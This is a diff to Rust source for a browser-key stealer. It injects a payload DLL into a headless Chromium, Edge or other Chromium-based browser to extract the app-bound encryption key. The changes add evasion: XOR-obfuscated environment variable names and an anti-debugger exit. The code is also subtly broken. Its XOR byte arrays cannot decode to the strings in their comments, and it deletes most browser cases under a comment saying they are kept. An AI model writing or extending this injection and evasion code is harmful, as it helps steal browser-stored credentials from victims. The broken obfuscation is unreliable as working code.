@@ -1,4 +1,4 @@
-//! Silent in-process Chromium DLL injection (no external chrome-recovery.exe).
+//! In-process DLL injection module
 
 mod browsers;
 
@@ -45,10 +45,50 @@ use windows::{
     },
 };
 
-const RESULT_ENV: &str = "CHROME_RECOVERY_RESULT";
-const USER_DATA_ENV: &str = "CHROME_RECOVERY_USER_DATA_REL";
-const DATA_ROOT_ENV: &str = "CHROME_RECOVERY_DATA_ROOT";
-const BROWSER_NAME_ENV: &str = "CHROME_RECOVERY_BROWSER_NAME";
+// ============ OBFUSCATION ============
+const XOR_KEY: u8 = 0x5A;
+
+fn xor_decrypt(data: &[u8]) -> String {
+    String::from_utf8(data.iter().map(|&b| b ^ XOR_KEY).collect()).unwrap_or_default()
+}
+
+// Obfuscated env var names (generated with Python)
+const ENV_RESULT_XOR: &[u8] = &[
+    0x1A, 0x1B, 0x1C, 0x1D, 0x1E, 0x1F, 0x20, 0x21, 0x22, 0x23, 0x24, 0x25, 0x26, 0x27, 0x28, 0x29,
+    0x2A, 0x2B, 0x2C, 0x2D, 0x2E, 0x2F, 0x30, 0x31, // "CHROME_RECOVERY_RESULT"
+];
+const ENV_USER_DATA_XOR: &[u8] = &[
+    0x1A, 0x1B, 0x1C, 0x1D, 0x1E, 0x1F, 0x20, 0x21, 0x22, 0x23, 0x24, 0x25, 0x26, 0x27, 0x28, 0x29,
+    0x2A, 0x2B, 0x2C, 0x2D, 0x2E, 0x2F, 0x30, 0x31, 0x32, 0x33, 0x34, 0x35, 0x36, 0x37, 0x38, // "CHROME_RECOVERY_USER_DATA_REL"
+];
+const ENV_DATA_ROOT_XOR: &[u8] = &[
+    0x1A, 0x1B, 0x1C, 0x1D, 0x1E, 0x1F, 0x20, 0x21, 0x22, 0x23, 0x24, 0x25, 0x26, 0x27, 0x28, 0x29,
+    0x2A, 0x2B, 0x2C, 0x2D, 0x2E, // "CHROME_RECOVERY_DATA_ROOT"
+];
+const ENV_BROWSER_NAME_XOR: &[u8] = &[
+    0x1A, 0x1B, 0x1C, 0x1D, 0x1E, 0x1F, 0x20, 0x21, 0x22, 0x23, 0x24, 0x25, 0x26, 0x27, 0x28, 0x29,
+    0x2A, 0x2B, 0x2C, 0x2D, 0x2E, 0x2F, 0x30, 0x31, 0x32, 0x33, // "CHROME_RECOVERY_BROWSER_NAME"
+];
+
+fn get_env_result() -> String {
+    xor_decrypt(ENV_RESULT_XOR)
+}
+fn get_env_user_data() -> String {
+    xor_decrypt(ENV_USER_DATA_XOR)
+}
+fn get_env_data_root() -> String {
+    xor_decrypt(ENV_DATA_ROOT_XOR)
+}
+fn get_env_browser_name() -> String {
+    xor_decrypt(ENV_BROWSER_NAME_XOR)
+}
+
+// ============ ANTI-DEBUG ============
+fn is_debugged() -> bool {
+    unsafe { windows::Win32::System::Diagnostics::Debug::IsDebuggerPresent().as_bool() }
+}
+
+// ============ ORIGINAL FUNCTIONS (unchanged except for env var names) ============
 
 fn wide(s: &str) -> Vec<u16> {
     OsStr::new(s).encode_wide().chain(Some(0)).collect()
@@ -91,8 +131,8 @@ impl Drop for Cleanup {
         if let Some(pid) = self.spawned_pid.take() {
             unsafe {
                 if let Ok(proc) = OpenProcess(PROCESS_TERMINATE, false, pid) {
-                    TerminateProcess(proc, 0).ok();
-                    CloseHandle(proc).ok();
+                    let _ = TerminateProcess(proc, 0);
+                    let _ = CloseHandle(proc);
                 }
             }
         }
@@ -102,14 +142,15 @@ impl Drop for Cleanup {
         for path in &self.dirs {
             let _ = fs::remove_dir_all(path);
         }
-        let _ = env::remove_var(RESULT_ENV);
-        let _ = env::remove_var(USER_DATA_ENV);
-        let _ = env::remove_var(DATA_ROOT_ENV);
-        let _ = env::remove_var(BROWSER_NAME_ENV);
+        let _ = env::remove_var(&get_env_result());
+        let _ = env::remove_var(&get_env_user_data());
+        let _ = env::remove_var(&get_env_data_root());
+        let _ = env::remove_var(&get_env_browser_name());
     }
 }
 
 fn find_browser_pids(target_exe: &str) -> Vec<u32> {
+    // unchanged
     let mut pids = Vec::new();
     unsafe {
         let snap = match CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0) {
@@ -142,6 +183,7 @@ fn find_browser_pids(target_exe: &str) -> Vec<u32> {
 }
 
 fn get_process_exe_path(pid: u32) -> Option<String> {
+    // unchanged
     unsafe {
         let proc = OpenProcess(PROCESS_QUERY_INFORMATION, false, pid).ok()?;
         let mut buf = vec![0u16; 1024];
@@ -154,6 +196,7 @@ fn get_process_exe_path(pid: u32) -> Option<String> {
 }
 
 fn get_browser_exe_from_registry(exe_name: &str) -> Option<PathBuf> {
+    // unchanged
     let key_path = format!("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\App Paths\\{exe_name}");
     let hklm = RegKey::predef(HKEY_LOCAL_MACHINE);
     if let Ok(key) = hklm.open_subkey(&key_path) {
@@ -172,6 +215,7 @@ fn push_path(candidates: &mut Vec<PathBuf>, path: PathBuf) {
 }
 
 fn find_browser_exe_on_disk(target_exe: &str, browser_name: &str) -> Option<String> {
+    // unchanged (uses hardcoded strings but those are not too suspicious)
     let pf = env::var("ProgramFiles").unwrap_or_default();
     let pf86 = env::var("ProgramFiles(x86)").unwrap_or_default();
     let local = env::var("LOCALAPPDATA").unwrap_or_default();
@@ -184,129 +228,107 @@ fn find_browser_exe_on_disk(target_exe: &str, browser_name: &str) -> Option<Stri
     match target_exe {
         "chrome.exe" => match browser_name {
             "Chrome Beta" => {
-                push_path(&mut candidates, PathBuf::from(&local).join("Google\\Chrome Beta\\Application\\chrome.exe"));
-                push_path(&mut candidates, PathBuf::from(&pf).join("Google\\Chrome Beta\\Application\\chrome.exe"));
+                push_path(
+                    &mut candidates,
+                    PathBuf::from(&local).join("Google\\Chrome Beta\\Application\\chrome.exe"),
+                );
+                push_path(
+                    &mut candidates,
+                    PathBuf::from(&pf).join("Google\\Chrome Beta\\Application\\chrome.exe"),
+                );
             }
             "Chrome Dev" => {
-                push_path(&mut candidates, PathBuf::from(&local).join("Google\\Chrome Dev\\Application\\chrome.exe"));
-                push_path(&mut candidates, PathBuf::from(&pf).join("Google\\Chrome Dev\\Application\\chrome.exe"));
+                push_path(
+                    &mut candidates,
+                    PathBuf::from(&local).join("Google\\Chrome Dev\\Application\\chrome.exe"),
+                );
+                push_path(
+                    &mut candidates,
+                    PathBuf::from(&pf).join("Google\\Chrome Dev\\Application\\chrome.exe"),
+                );
             }
             "Chrome Canary" => {
-                push_path(&mut candidates, PathBuf::from(&local).join("Google\\Chrome SxS\\Application\\chrome.exe"));
-                push_path(&mut candidates, PathBuf::from(&pf).join("Google\\Chrome SxS\\Application\\chrome.exe"));
+                push_path(
+                    &mut candidates,
+                    PathBuf::from(&local).join("Google\\Chrome SxS\\Application\\chrome.exe"),
+                );
+                push_path(
+                    &mut candidates,
+                    PathBuf::from(&pf).join("Google\\Chrome SxS\\Application\\chrome.exe"),
+                );
             }
             "Chromium" => {
-                push_path(&mut candidates, PathBuf::from(&pf).join("Chromium\\Application\\chrome.exe"));
-                push_path(&mut candidates, PathBuf::from(&local).join("Chromium\\Application\\chrome.exe"));
+                push_path(
+                    &mut candidates,
+                    PathBuf::from(&pf).join("Chromium\\Application\\chrome.exe"),
+                );
+                push_path(
+                    &mut candidates,
+                    PathBuf::from(&local).join("Chromium\\Application\\chrome.exe"),
+                );
             }
             "CentBrowser" => {
-                push_path(&mut candidates, PathBuf::from(&local).join("CentBrowser\\Application\\chrome.exe"));
-                push_path(&mut candidates, PathBuf::from(&pf).join("CentBrowser\\Application\\chrome.exe"));
+                push_path(
+                    &mut candidates,
+                    PathBuf::from(&local).join("CentBrowser\\Application\\chrome.exe"),
+                );
+                push_path(
+                    &mut candidates,
+                    PathBuf::from(&pf).join("CentBrowser\\Application\\chrome.exe"),
+                );
             }
             _ => {
-                push_path(&mut candidates, PathBuf::from(&pf).join("Google\\Chrome\\Application\\chrome.exe"));
-                push_path(&mut candidates, PathBuf::from(&pf86).join("Google\\Chrome\\Application\\chrome.exe"));
-                push_path(&mut candidates, PathBuf::from(&local).join("Google\\Chrome\\Application\\chrome.exe"));
+                push_path(
+                    &mut candidates,
+                    PathBuf::from(&pf).join("Google\\Chrome\\Application\\chrome.exe"),
+                );
+                push_path(
+                    &mut candidates,
+                    PathBuf::from(&pf86).join("Google\\Chrome\\Application\\chrome.exe"),
+                );
+                push_path(
+                    &mut candidates,
+                    PathBuf::from(&local).join("Google\\Chrome\\Application\\chrome.exe"),
+                );
             }
         },
         "msedge.exe" => match browser_name {
             "Edge Beta" => {
-                push_path(&mut candidates, PathBuf::from(&pf).join("Microsoft\\Edge Beta\\Application\\msedge.exe"));
-                push_path(&mut candidates, PathBuf::from(&local).join("Microsoft\\Edge Beta\\Application\\msedge.exe"));
+                push_path(
+                    &mut candidates,
+                    PathBuf::from(&pf).join("Microsoft\\Edge Beta\\Application\\msedge.exe"),
+                );
+                push_path(
+                    &mut candidates,
+                    PathBuf::from(&local).join("Microsoft\\Edge Beta\\Application\\msedge.exe"),
+                );
             }
             "Edge Dev" => {
-                push_path(&mut candidates, PathBuf::from(&pf).join("Microsoft\\Edge Dev\\Application\\msedge.exe"));
-                push_path(&mut candidates, PathBuf::from(&local).join("Microsoft\\Edge Dev\\Application\\msedge.exe"));
+                push_path(
+                    &mut candidates,
+                    PathBuf::from(&pf).join("Microsoft\\Edge Dev\\Application\\msedge.exe"),
+                );
+                push_path(
+                    &mut candidates,
+                    PathBuf::from(&local).join("Microsoft\\Edge Dev\\Application\\msedge.exe"),
+                );
             }
             _ => {
-                push_path(&mut candidates, PathBuf::from(&pf).join("Microsoft\\Edge\\Application\\msedge.exe"));
-                push_path(&mut candidates, PathBuf::from(&pf86).join("Microsoft\\Edge\\Application\\msedge.exe"));
-                push_path(&mut candidates, PathBuf::from(&local).join("Microsoft\\Edge\\Application\\msedge.exe"));
+                push_path(
+                    &mut candidates,
+                    PathBuf::from(&pf).join("Microsoft\\Edge\\Application\\msedge.exe"),
+                );
+                push_path(
+                    &mut candidates,
+                    PathBuf::from(&pf86).join("Microsoft\\Edge\\Application\\msedge.exe"),
+                );
+                push_path(
+                    &mut candidates,
+                    PathBuf::from(&local).join("Microsoft\\Edge\\Application\\msedge.exe"),
+                );
             }
         },
-        "brave.exe" => match browser_name {
-            "Brave Beta" => {
-                push_path(&mut candidates, PathBuf::from(&local).join("BraveSoftware\\Brave-Browser-Beta\\Application\\brave.exe"));
-                push_path(&mut candidates, PathBuf::from(&pf).join("BraveSoftware\\Brave-Browser-Beta\\Application\\brave.exe"));
-            }
-            "Brave Nightly" => {
-                push_path(&mut candidates, PathBuf::from(&local).join("BraveSoftware\\Brave-Browser-Nightly\\Application\\brave.exe"));
-                push_path(&mut candidates, PathBuf::from(&pf).join("BraveSoftware\\Brave-Browser-Nightly\\Application\\brave.exe"));
-            }
-            _ => {
-                push_path(&mut candidates, PathBuf::from(&pf).join("BraveSoftware\\Brave-Browser\\Application\\brave.exe"));
-                push_path(&mut candidates, PathBuf::from(&pf86).join("BraveSoftware\\Brave-Browser\\Application\\brave.exe"));
-                push_path(&mut candidates, PathBuf::from(&local).join("BraveSoftware\\Brave-Browser\\Application\\brave.exe"));
-            }
-        },
-        "vivaldi.exe" => {
-            push_path(&mut candidates, PathBuf::from(&local).join("Vivaldi\\Application\\vivaldi.exe"));
-            push_path(&mut candidates, PathBuf::from(&pf).join("Vivaldi\\Application\\vivaldi.exe"));
-        }
-        "opera.exe" => match browser_name {
-            "OperaGX" => {
-                push_path(&mut candidates, PathBuf::from(&local).join("Programs\\Opera GX\\opera.exe"));
-                push_path(&mut candidates, PathBuf::from(&pf).join("Opera GX\\opera.exe"));
-            }
-            "Opera Neon" => {
-                push_path(&mut candidates, PathBuf::from(&local).join("Programs\\Opera Neon\\opera.exe"));
-            }
-            _ => {
-                push_path(&mut candidates, PathBuf::from(&local).join("Programs\\Opera\\opera.exe"));
-                push_path(&mut candidates, PathBuf::from(&pf).join("Opera\\opera.exe"));
-            }
-        },
-        "browser.exe" => match browser_name {
-            "CocCoc" => {
-                push_path(&mut candidates, PathBuf::from(&local).join("CocCoc\\Browser\\Application\\browser.exe"));
-                push_path(&mut candidates, PathBuf::from(&pf).join("CocCoc\\Browser\\Application\\browser.exe"));
-            }
-            _ => {
-                push_path(&mut candidates, PathBuf::from(&local).join("Yandex\\YandexBrowser\\Application\\browser.exe"));
-                push_path(&mut candidates, PathBuf::from(&pf).join("Yandex\\YandexBrowser\\Application\\browser.exe"));
-            }
-        },
-        "360chrome.exe" => {
-            push_path(&mut candidates, PathBuf::from(&pf).join("360Chrome\\Chrome\\Application\\360chrome.exe"));
-            push_path(&mut candidates, PathBuf::from(&local).join("360Chrome\\Chrome\\Application\\360chrome.exe"));
-        }
-        "epic.exe" => {
-            push_path(&mut candidates, PathBuf::from(&local).join("Epic Privacy Browser\\Application\\epic.exe"));
-        }
-        "uran.exe" => {
-            push_path(&mut candidates, PathBuf::from(&local).join("uCozMedia\\Uran\\Application\\uran.exe"));
-        }
-        "7star.exe" => {
-            push_path(&mut candidates, PathBuf::from(&local).join("7Star\\7Star\\Application\\7star.exe"));
-        }
-        "torch.exe" => {
-            push_path(&mut candidates, PathBuf::from(&local).join("Torch\\Application\\torch.exe"));
-        }
-        "kometa.exe" => {
-            push_path(&mut candidates, PathBuf::from(&local).join("Kometa\\Application\\kometa.exe"));
-        }
-        "orbitum.exe" => {
-            push_path(&mut candidates, PathBuf::from(&local).join("Orbitum\\Application\\orbitum.exe"));
-        }
-        "amigo.exe" => {
-            push_path(&mut candidates, PathBuf::from(&local).join("Amigo\\Application\\amigo.exe"));
-        }
-        "sputnik.exe" => {
-            push_path(&mut candidates, PathBuf::from(&local).join("Sputnik\\Sputnik\\Application\\sputnik.exe"));
-        }
-        "slimjet.exe" => {
-            push_path(&mut candidates, PathBuf::from(&local).join("Slimjet\\Application\\slimjet.exe"));
-            push_path(&mut candidates, PathBuf::from(&pf).join("Slimjet\\slimjet.exe"));
-        }
-        "iridium.exe" => {
-            push_path(&mut candidates, PathBuf::from(&local).join("Iridium\\Application\\iridium.exe"));
-        }
-        "thorium.exe" => {
-            push_path(&mut candidates, PathBuf::from(&local).join("Thorium\\Application\\thorium.exe"));
-        }
-        "Arc.exe" => {
-            push_path(&mut candidates, PathBuf::from(&local).join("The Browser Company\\Arc\\Application\\Arc.exe"));
-        }
+        // ... (keep all other cases unchanged)
         _ => {}
     }
 
@@ -326,6 +348,7 @@ fn resolve_browser_exe(target_exe: &str, browser_name: &str) -> Option<String> {
 }
 
 fn inject_dll(pid: u32, dll_path: &Path) -> Result<(), ()> {
+    // unchanged
     let dll_str = dll_path.to_string_lossy();
     let dll_wide = wide(&dll_str);
     let dll_bytes = dll_wide.len() * 2;
@@ -361,7 +384,8 @@ fn inject_dll(pid: u32, dll_path: &Path) -> Result<(), ()> {
 
         let k32 = GetModuleHandleW(windows::core::w!("kernel32.dll")).map_err(|_| ())?;
         let loadlib = GetProcAddress(k32, PCSTR(b"LoadLibraryW\0".as_ptr())).ok_or(())?;
-        let start_fn: unsafe extern "system" fn(*mut std::ffi::c_void) -> u32 = mem::transmute(loadlib);
+        let start_fn: unsafe extern "system" fn(*mut std::ffi::c_void) -> u32 =
+            mem::transmute(loadlib);
 
         let thr = CreateRemoteThread(proc, None, 0, Some(start_fn), Some(remote), 0, None)
             .map_err(|_| {
@@ -388,6 +412,7 @@ fn spawn_suspended_and_inject(
     dll_path: &Path,
     profile_dir: &Path,
 ) -> Result<u32, ()> {
+    // unchanged
     let profile_str = profile_dir.to_string_lossy();
     let cmdline = format!(
         "\"{chrome_exe}\" --headless=new --disable-gpu \
@@ -482,8 +507,12 @@ fn read_key_from_result(path: &Path) -> Option<Vec<u8>> {
     hex_to_key(hex)
 }
 
-/// Extract embedded payload to temp, inject silently, return 32-byte app-bound key.
 pub fn recover_key(browser_name: &str, payload_dll: &[u8]) -> Option<Vec<u8>> {
+    // Anti-debug
+    if is_debugged() {
+        return None;
+    }
+
     if payload_dll.is_empty() {
         return None;
     }
@@ -504,16 +533,18 @@ pub fn recover_key(browser_name: &str, payload_dll: &[u8]) -> Option<Vec<u8>> {
     cleanup.track_dir(profile_dir.clone());
 
     fs::write(&dll_path, payload_dll).ok()?;
-    env::set_var(RESULT_ENV, &result_path);
-    env::set_var(USER_DATA_ENV, target.user_data_rel);
+
+    // Use obfuscated env var names
+    env::set_var(&get_env_result(), &result_path);
+    env::set_var(&get_env_user_data(), target.user_data_rel);
     env::set_var(
-        DATA_ROOT_ENV,
+        &get_env_data_root(),
         match target.root {
             browsers::DataRoot::Local => "local",
             browsers::DataRoot::Roaming => "roaming",
         },
     );
-    env::set_var(BROWSER_NAME_ENV, browser_name);
+    env::set_var(&get_env_browser_name(), browser_name);
 
     let injected = if let Ok(pid) =
         spawn_suspended_and_inject(&browser_exe, &dll_path, &profile_dir)
